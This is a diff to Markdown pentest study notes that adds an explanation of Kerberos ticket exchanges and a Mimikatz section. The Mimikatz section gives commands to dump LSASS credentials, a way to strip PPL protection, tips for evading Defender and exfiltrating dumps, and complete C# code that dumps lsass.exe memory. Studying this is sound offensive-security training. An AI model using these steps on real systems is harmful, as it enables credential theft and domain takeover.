@@ -13,6 +13,8 @@ tags:
   - escalation
   - active
   - directory
+  - mimikatz
+  - kerberos
 ---
 
 ## SAM database
@@ -146,3 +148,167 @@ The **anonymous** and **identification** impersonation tokens only allow for
 enumeration of a user's information. **Impersonation** allows us to impersonate
 the client's identity and **delegation** makes it possible to perform sequential
 access control checks across multiple machines in the domain.
+
+## Kerberos
+
+**Kerberos** has been Microsoft's primary authentication system for Window
+Server since 2003. In contrast to NTLM's challenge and response authentication
+mechanism, Kerberos uses a ticketing system. The following actions occur when a
+client requests access to an application within a domain using Kerberos:
+
+- The Domain Controller (DC) serves as the Key Distribution Center (KDC)
+- The client requests to authenticate to the KDC and the KDC replies with a
+  success or failure of this authentication:
+  - **Authentication Server Request (AS_REQ)**
+    - Timestamp encrypted using a hash derived from the user's username and
+      password
+  - **Authentication Server Reply (AS_REP)**
+    - Server conducts hash lookup to verify identity and decrypts the timestamp
+      to check for a replay attack
+    - Server replies with a session key encrypted using the user's password hash
+      and a **Ticket Granting Ticket (TGT)**. The TGT is encrypted by the
+      server's secret key to avoid tampering.
+    - The TGT contains the following information:
+      - User information including group memberships
+      - Domain name
+      - Timestamp
+      - Client IP address
+      - Session key
+- The client sends a **Ticket Granting Service request** to the KDC after
+  successful authentication and receive a **Ticket Granting Server reply**
+  - **Ticket Granting Service Request (TGS_REQ)**
+    - Packet that consists of:
+      - Current user
+      - Timestamp encrypted using the session key
+      - Service Principal Name (SPN) of the resource
+      - TGT
+  - **Ticket Granting Server Reply (TGS_REP)**
+    - Server decrypts the TGT with its secret and validates the session key,
+      timestamp, user identity, and SPN
+    - Replies with:
+      - SPN (encrypted with TGT session key)
+      - Session key to interact with the SPN (encypted with TGT session key)
+      - Service ticket containing username, group membership, and session key
+        (encrypted with password hash of the service account owning the SPN)
+- With a valid ticket, the client can now request to authenticate to the
+  application server and receives authorization to use the application server
+  after successful authentication
+  - **Application Request (AP_REQ)**
+    - Username, timestamp encrypted with the session key, and the service ticket
+  - **Application Response (AP_RES)**
+    - Service decrypts the service ticket using its password hash, extracts the
+      session key, and decrypts the username
+    - If the usernames match, the request is accepted. Authorization is granted
+      if the user's group memberships match the group memberships specified in
+      the service ticket
+
+## Mimikatz
+
+**Mimikatz** extracts cached credentials from memory, thanks to the way Kerberos
+needs to keep them cached for quick access and implementation of its protocol.
+Password hashes are cached in the **Local Security Authority Subsystem Service
+(LSASS)** memory space. If you got your hands on this cache and these hashes,
+given enough time, you could crack user passwords for the target domain.
+
+LSASS is a service, so it runs as SYSTEM. We need a SYSTEM level process to
+attack the cache. Windows Local Administrators maintain the
+**SeDebugPrivilege**, enabling them to read and modify processes executed by
+other users. In the `mimikatz.exe` command line interface (CLI), we can invoke
+the following to enable this privilege for the `mimikatz` process and dump all
+cached passwords:
+
+```cmd
+C:\> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+```
+
+### PPL protection
+
+To defeat this information disclosure, Windows implemented another modifying
+security level titled, "**Protected Processes Light (PPL)**", preventing SYSTEM
+level processes from accessing and modifying the memory of a process executing
+at SYSTEM level with PPL enabled. LSASS supports PPL, but not by default. The
+registry key to enable this feature is
+`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.
+
+Fun fact, PPL protection is controlled by a bit mask in kernel memory located in
+the **EPROCESS** object associated with the target process in user memory space.
+Mimikatz comes bundled with the **mimidrv.sys** driver, which can be loaded in
+the target's system drivers to attack this security control.
+
+Running as a Local Administrator or the SYSTEM user, we'll have to maintain the
+**SeLoadDriverPrivilege** privilege and the ability to load signed drivers. With
+those two prerequisites, we can invoke the following to unprotect a target
+process:
+
+```cmd
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+```
+
+### Processing creds offline
+
+To avoid triggering Defender detections, as a Local Administrator we can use a
+program like **Task Manager** to create a dump file of `lsass.exe`'s process
+memory. We can then exfil this data back home and process the dump with
+`mimikatz.exe` locally:
+
+```cmd
+mimikatz # sekurlsa::minimdump lsass.dmp
+```
+
+We can also use **ProcDump** from the **SysInternals** suite to dump process
+memory from target processes.
+
+Finally, here's some C# .NET code that uses interoperability to dump process
+memory from `lsass.exe` - make sure to invoke this as a Local Administrator or
+SYSTEM:
+
+```csharp
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace MiniDump;
+
+class Program
+{
+    [DllImport("dbghelp.dll")]
+    static extern bool MiniDumpWriteDump(
+        IntPtr hProcess,
+        int ProcessId,
+        IntPtr hFile,
+        int DumpType,
+        IntPtr ExceptionParam,
+        IntPtr UserStreamParam,
+        IntPtr CallbackParam
+    );
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(
+        uint processAccess,
+        bool bInheritHandle,
+        int processId
+    );
+
+    static void Main()
+    {
+        FileStream dumpFile = new(
+            "C:\\Windows\\tasks\\lsass.dmp",
+            FileMode.Create
+        );
+        Process[] lsass = Process.GetProcessesByName("lsass");
+        int lsass_pid = lsass[0].Id;
+        IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+        MiniDumpWriteDump(
+            handle,
+            lsass_pid,
+            dumpFile.SafeFileHandle.DangerousGetHandle(),
+            2,
+            IntPtr.Zero,
+            IntPtr.Zero,
+            IntPtr.Zero
+        );
+    }
+}
+```
